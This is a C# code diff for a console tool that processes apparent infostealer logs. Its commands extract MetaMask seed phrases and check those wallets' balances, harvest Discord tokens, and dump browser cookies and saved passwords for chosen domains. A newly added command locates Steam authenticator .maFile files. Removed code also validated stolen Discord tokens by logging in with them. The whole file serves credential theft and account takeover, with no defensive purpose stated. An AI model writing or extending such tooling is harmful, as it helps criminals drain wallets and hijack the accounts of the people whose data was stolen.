@@ -13,14 +13,16 @@ public class MainView : ArgsView
 {
     private readonly Settings _settings;
     private readonly IConfiguration _config;
+    private readonly SaverService _save;
     
-    public MainView(IRoot root, Settings settings, IConfiguration config) : base(root)
+    public MainView(IRoot root, Settings settings, IConfiguration config, SaverService save) : base(root)
     {
         _settings = settings;
         _config = config;
+        _save = save;
     }
 
-    [Command]
+    [Command, Redirect]
     public Task Checkers()
     {
         Root.PushRedirect<CheckersView>();
@@ -30,21 +32,17 @@ public class MainView : ArgsView
     [Command]
     public async Task Wallets()
     {
-        await using var mnemonics = new StreamWriter("Wallets/mnemonics.txt", new FileStreamOptions
-        {
-            Access = FileAccess.ReadWrite,
-            Mode = FileMode.OpenOrCreate,
-        });
-        mnemonics.BaseStream.Position = mnemonics.BaseStream.Length;
         var checker = new MetamaskChecker(_config["Web3:Eth"]!, _config["Web3:Bsc"]!);
+        var wallets = new MetamaskParser().ByLogs(_settings.Path);
+
+        await _save.SaveAsync("mnemonics", wallets.Select(x => x?.Mnemonic).Distinct());
         
-        foreach (var wallet in new MetamaskParser().ByLogs(_settings.Path).DistinctBy(x => x?.Mnemonic))
+        foreach (var wallet in wallets)
         {
             if (wallet is not {Mnemonic:not null, Password:not null} ||
                 wallet.Mnemonic.Split(' ').Length != 12) continue;
             
             System.Console.WriteLine(wallet.Mnemonic);
-            await mnemonics.WriteLineAsync(wallet.Mnemonic);
             
             foreach (var account in wallet.Accounts.Values.OrderBy(x => x.Name))
             {
@@ -62,91 +60,47 @@ public class MainView : ArgsView
     }
 
     [Command]
-    public Task Discord()
+    public async Task Discord()
     {
-        StreamWriter? all, invalid = null, valid = null;
-        
-        System.Console.WriteLine("Check tokens? [Y/N]"); // todo add check proxies
-
-        var check = System.Console.ReadKey(true).Key == ConsoleKey.Y;
-
-        all = new StreamWriter("Discord/tokens.txt", true);
-        
-        if (check)
-        {
-            invalid = new StreamWriter("Discord/invalid.txt", true);
-            valid = new StreamWriter("Discord/valid.txt", true);
-        }
-
-        foreach (var token in new DiscordParser().ByLogs(_settings.Path).Distinct())
-        {
-            all.WriteLine(token);
-
-            if (!check) continue;
-
-            if (DiscordChecker.TryLogin(token) is {} account)
-            {
-                System.Console.WriteLine($"Token: {token}\nFriends: {DiscordChecker.Friends(token)?.Count() ?? 0}");
-                valid!.WriteLine(token);
-            }
-            else
-                invalid!.WriteLine(token);
-        }
-
-        all.Dispose();
-        invalid?.Dispose();
-        valid?.Dispose();
+        await _save.SaveAsync("tokens.txt", _settings.Path.DiscordByLogs().Distinct());
 
         _ExitWait();
-        return Task.CompletedTask;
     }
 
     [Command]
-    public Task Links()
+    public async Task Links()
     {
-        using var writer = new StreamWriter("Links/links.txt", true);
         var links = File.ReadAllLines("links.txt").Select(x => x.Trim());
         
-        foreach (var account in links.LinksFromLogs(_settings.Path))
-        {
-            System.Console.WriteLine(account.ToString());
-            writer.WriteLine(account.ToString());
-        }
+        await _save.SaveAsync("links.txt", links.LinksFromLogs(_settings.Path).Select(x => x.ToString()));
 
         _ExitWait();
-        return Task.CompletedTask;
     }
 
     [Command]
-    public Task Cookies()
+    public async Task Cookies()
     {
-        var folder = $"Cookies/{new DirectoryInfo(_settings.Path).Name}";
-        Directory.CreateDirectory(folder);
-
         var domains = File.ReadAllLines("cookies.txt").Select(x => x.Trim());
 
         foreach (var (domain, cookies) in domains.CookiesFromLogs(_settings.Path)
                      .ToDictionary(
                          x => x.Key,
-                         x => x.Value.Where(x => x.Any()).ToArray()
+                         x => x.Value.Where(cookies => cookies.Any()).ToArray()
                      )
                 )
         {
-            Directory.CreateDirectory(Path.Combine(folder, domain));
-            
             for (var i = 0; i < cookies.Length; i++)
             {
-                File.WriteAllLines(Path.Combine(folder, domain, $"cookie{i}.txt"), cookies[i]);
+                await _save.SaveAsync($"cookies{i}", cookies[i], subpath: domain);
             }
         }
 
 
         _ExitWait();
-        return Task.CompletedTask;
     }
 
     [Command]
-    public Task Accounts()
+    public async Task Accounts()
     {
         var domains = File.ReadAllLines("accounts.txt").Select(x => x.Trim());
 
@@ -161,9 +115,26 @@ public class MainView : ArgsView
                      )
                 )
         {
-            File.WriteAllLines($"Passwords/{domain}.txt", accounts);
+            await _save.SaveAsync(domain, accounts);
         }
 
+        _ExitWait();
+    }
+
+    [Command]
+    public Task Steam_maFiles()
+    {
+        foreach (var log in Directory.GetDirectories(_settings.Path))
+        {
+            if (!Directory.Exists(Path.Combine(log, "Steam"))) continue;
+            
+            var files = Directory.GetFiles(Path.Combine(log, "Steam"), ".maFile");
+            
+            if (!files.Any()) continue;
+            
+            System.Console.WriteLine(new FileInfo(files.First()).Directory?.FullName);
+        }
+        
         _ExitWait();
         return Task.CompletedTask;
     }
